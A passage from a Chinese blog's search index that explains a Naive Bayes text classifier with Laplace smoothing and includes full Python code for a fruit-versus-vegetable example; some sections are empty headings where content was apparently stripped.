-<h3 id="定义数据类型"><a href="#定义数据类型" class="headerlink" title="定义数据类型"></a>定义数据类型</h3> 
-<p>用于统计某个词出现的个数。<br>例如字典：</p>
-<ul>
-<li>统计苹果在水果标签下出现的次数，苹果在蔬菜标签下出现的次数</li>
-<li>统计标签出现的次数，如水果下出现的单词的总数</li>
-<li>存储苹果，水果，蔬菜，香蕉，黄瓜等所有特征值</li>
-<li>存储所有类别，就是水果和蔬菜</li>
-</ul>
-<h3 id="统计个数"><a href="#统计个数" class="headerlink" title="统计个数"></a>统计个数</h3> 
-
-<h3 id="拉普拉斯平滑-1"><a href="#拉普拉斯平滑-1" class="headerlink" title="拉普拉斯平滑"></a>拉普拉斯平滑</h3> 
-
-<p>实现这个条件概率公式计算</p>
- 
-
-<h3 id="预测"><a href="#预测" class="headerlink" title="预测"></a>预测</h3><p>这个<code>predict</code>方法是<strong>朴素贝叶斯分类的核心预测逻辑</strong>，本质是通过「贝叶斯定理」计算文本属于每个类别的后验概率，最终选择概率最大的类别作为预测结果。</p>
-  
- 
- 
-
-<p>由P(text|c)它是似然概率，即不同产品在该类别下的概率的乘积。故不能有概率为0的事件，所以进行拉普拉斯变换。</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 1. 计算先验概率P(类别)：该类别总词数 / 所有类别总词数之和</span><br><span class="line">            prior = self.class_total_count[cls] / sum(self.class_total_count.values())</span><br><span class="line">            log_prior = np.log(prior)</span><br><span class="line">这里是计算P(C),然后取对数log(P(C))</span><br></pre></td></tr></table></figure></div>
-
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 2. 计算条件概率的对数和：sum(log(P(单词|类别)))</span><br><span class="line">            log_likelihood = 0</span><br><span class="line">            for word in words:</span><br><span class="line">                # 获取当前单词在该类别下的条件概率</span><br><span class="line">                prob = self._calc_word_prob(word, cls)</span><br><span class="line">                # 累加对数概率（避免连乘导致数值过小）</span><br><span class="line">                log_likelihood += np.log(prob)</span><br><span class="line"> 这里是计算在类别下的单词出现概率 P(word|C),然后取对数相加</span><br></pre></td></tr></table></figure></div>
-
- 
-
-<h2 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">from collections import defaultdict</span><br><span class="line"></span><br><span class="line">class NaiveBayesWithLaplace:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    带拉普拉斯平滑的朴素贝叶斯分类器（适用于文本分类）</span><br><span class="line">    核心解决：离散特征的零概率问题，保证概率分布的完整性</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    def __init__(self):</span><br><span class="line">        # 统计字典：key=类别，value=子字典（key=单词，value=该单词在该类别下的出现次数）</span><br><span class="line">        self.class_word_count = defaultdict(lambda: defaultdict(int))</span><br><span class="line">        # 统计字典：key=类别，value=该类别下所有单词的总出现次数</span><br><span class="line">        self.class_total_count = defaultdict(int)</span><br><span class="line">        # 集合：存储所有出现过的唯一单词（构建词汇表，用于确定拉普拉斯平滑的特征维度N）</span><br><span class="line">        self.vocab = set()</span><br><span class="line">        # 集合：存储所有类别（如示例中的&quot;水果&quot;、&quot;蔬菜&quot;）</span><br><span class="line">        self.classes = set()</span><br><span class="line"></span><br><span class="line">    def fit(self, texts, labels):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        训练模型：统计每个类别下的词频、总词数，构建词汇表</span><br><span class="line">        Args:</span><br><span class="line">            texts (list): 训练文本列表，每个元素是空格分隔的字符串（如[&quot;苹果 很甜&quot;, &quot;香蕉 软糯&quot;]）</span><br><span class="line">            labels (list): 训练文本对应的类别标签列表（如[&quot;水果&quot;, &quot;水果&quot;]）</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 遍历每个文本-标签对，统计词频</span><br><span class="line">        for text, label in zip(texts, labels):</span><br><span class="line">            # 将文本按空格切分为单词列表</span><br><span class="line">            words = text.split()</span><br><span class="line">            # 记录所有出现过的类别</span><br><span class="line">            self.classes.add(label)</span><br><span class="line">            # 遍历当前文本的每个单词，更新统计信息</span><br><span class="line">            for word in words: # word是text分开之后的数据 “苹果 很甜“</span><br><span class="line">                # 该类别下该单词的计数+1</span><br><span class="line">                self.class_word_count[label][word] += 1</span><br><span class="line">                # 该类别下的总词数+1</span><br><span class="line">                self.class_total_count[label] += 1</span><br><span class="line">                # 将单词加入词汇表（自动去重）</span><br><span class="line">                self.vocab.add(word)</span><br><span class="line">        # 词汇表大小 = 特征维度N（拉普拉斯平滑公式中的关键参数）</span><br><span class="line">        self.vocab_size = len(self.vocab)  </span><br><span class="line"></span><br><span class="line">    def _calc_word_prob(self, word, label):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        核心方法：计算P(单词|类别)，应用拉普拉斯平滑避免零概率</span><br><span class="line">        公式：P(f|c) = (count(f,c) + 1) / (count(c) + N*1)</span><br><span class="line">            count(f,c)：类别c中单词f的出现次数</span><br><span class="line">            count(c)：类别c的总词数</span><br><span class="line">            N：词汇表大小（特征维度）</span><br><span class="line">        Args:</span><br><span class="line">            word (str): 待计算概率的单词</span><br><span class="line">            label (str): 目标类别</span><br><span class="line">        Returns:</span><br><span class="line">            float: 平滑后的条件概率值（0~1之间）</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 获取该类别下该单词的出现次数（未出现则为0）</span><br><span class="line">        word_count = self.class_word_count[label].get(word, 0)</span><br><span class="line">        # 获取该类别下的总词数</span><br><span class="line">        total_count = self.class_total_count[label]</span><br><span class="line">        # 拉普拉斯平滑计算条件概率</span><br><span class="line">        prob = (word_count + 1) / (total_count + self.vocab_size)</span><br><span class="line">        return prob</span><br><span class="line"></span><br><span class="line">    def predict(self, text):</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        预测文本类别：计算每个类别的后验概率（对数形式避免数值下溢）</span><br><span class="line">        后验概率公式（对数）：log(P(c|text)) ∝ log(P(c)) + sum(log(P(word|c)))</span><br><span class="line">            P(c)：类别c的先验概率（训练集中该类别的词数占比）</span><br><span class="line">            P(word|c)：每个单词在类别c下的条件概率</span><br><span class="line">        Args:</span><br><span class="line">            text (str): 待预测的文本（空格分隔的字符串）</span><br><span class="line">        Returns:</span><br><span class="line">            str: 预测的类别标签</span><br><span class="line">        &quot;&quot;&quot;</span><br><span class="line">        # 将待预测文本切分为单词列表</span><br><span class="line">        words = text.split()</span><br><span class="line">        # 初始化最大后验概率（负无穷，确保第一个类别能被选中）</span><br><span class="line">        max_prob = -np.inf</span><br><span class="line">        # 初始化最优类别</span><br><span class="line">        best_class = None</span><br><span class="line"></span><br><span class="line">        # 遍历每个类别，计算该类别的后验概率</span><br><span class="line">        for cls in self.classes:</span><br><span class="line">            # 1. 计算先验概率P(类别)：该类别总词数 / 所有类别总词数之和</span><br><span class="line">            prior = self.class_total_count[cls] / sum(self.class_total_count.values())</span><br><span class="line">            log_prior = np.log(prior)</span><br><span class="line"></span><br><span class="line">            # 2. 计算条件概率的对数和：sum(log(P(单词|类别)))</span><br><span class="line">            log_likelihood = 0</span><br><span class="line">            for word in words:</span><br><span class="line">                # 获取当前单词在该类别下的条件概率</span><br><span class="line">                prob = self._calc_word_prob(word, cls)</span><br><span class="line">                # 累加对数概率（避免连乘导致数值过小）</span><br><span class="line">                log_likelihood += np.log(prob)</span><br><span class="line"></span><br><span class="line">            # 3. 总后验概率（对数形式）：先验概率对数 + 条件概率对数和</span><br><span class="line">            total_log_prob = log_prior + log_likelihood</span><br><span class="line"></span><br><span class="line">            # 打印每个类别的中间计算结果（便于分析）</span><br><span class="line">            print(f&quot;类别「&#123;cls&#125;」：先验概率对数=&#123;log_prior:.4f&#125;，条件概率对数和=&#123;log_likelihood:.4f&#125;，总后验概率对数=&#123;total_log_prob:.4f&#125;&quot;)</span><br><span class="line"></span><br><span class="line">            # 4. 更新最优类别（保留后验概率最大的类别）</span><br><span class="line">            if total_log_prob &gt; max_prob:</span><br><span class="line">                max_prob = total_log_prob</span><br><span class="line">                best_class = cls</span><br><span class="line"></span><br><span class="line">        # 返回预测的最优类别</span><br><span class="line">        return best_class</span><br><span class="line"></span><br><span class="line"># ---------------------- 非对称测试示例 ----------------------</span><br><span class="line"># 非对称训练数据：水果类5条（词数多），蔬菜类2条（词数少）</span><br><span class="line">train_texts = [</span><br><span class="line">    &quot;苹果 很甜&quot;, &quot;苹果 香甜&quot;, &quot;香蕉 软糯&quot;, &quot;草莓 酸甜&quot;, &quot;橙子 多汁&quot;,  # 水果类（5条）</span><br><span class="line">    &quot;黄瓜 脆爽&quot;, &quot;番茄 沙甜&quot;                                       # 蔬菜类（2条）</span><br><span class="line">]</span><br><span class="line">train_labels = [</span><br><span class="line">    &quot;水果&quot;, &quot;水果&quot;, &quot;水果&quot;, &quot;水果&quot;, &quot;水果&quot;,  # 水果类标签</span><br><span class="line">    &quot;蔬菜&quot;, &quot;蔬菜&quot;                           # 蔬菜类标签</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"># 1. 初始化带拉普拉斯平滑的朴素贝叶斯模型</span><br><span class="line">nb = NaiveBayesWithLaplace()</span><br><span class="line"># 2. 训练模型：统计词频、构建词汇表</span><br><span class="line">nb.fit(train_texts, train_labels)</span><br><span class="line"></span><br><span class="line"># 3. 预测测试文本的类别（仍用「苹果 脆爽」）</span><br><span class="line">test_text = &quot;苹果 脆爽&quot;</span><br><span class="line">pred = nb.predict(test_text)</span><br><span class="line"># 输出预测结果</span><br><span class="line">print(f&quot;\n文本「&#123;test_text&#125;」的预测类别：&#123;pred&#125;&quot;)</span><br><span class="line"></span><br><span class="line"># 4. 输出关键概率，验证拉普拉斯平滑效果</span><br><span class="line">print(&quot;\n=== 平滑后的概率 ===&quot;)</span><br><span class="line">for cls in [&quot;水果&quot;, &quot;蔬菜&quot;]:</span><br><span class="line">    # 计算P(苹果|类别)</span><br><span class="line">    p_apple = nb._calc_word_prob(&quot;苹果&quot;, cls)</span><br><span class="line">    # 计算P(脆爽|类别)</span><br><span class="line">    p_crisp = nb._calc_word_prob(&quot;脆爽&quot;, cls)</span><br><span class="line">    # 格式化输出（保留4位小数）</span><br><span class="line">    print(f&quot;P(苹果|&#123;cls&#125;) = &#123;p_apple:.4f&#125;, P(脆爽|&#123;cls&#125;) = &#123;p_crisp:.4f&#125;&quot;)</span><br></pre></td></tr></table></figure></div>
-
-<p>运行结果：</p>
- 
-
-]]></content>
-      <tags>
-        <tag>朴素贝叶斯</tag>
-        <tag>拉普拉斯平滑</tag>
       </tags>
   </entry>
 </search>
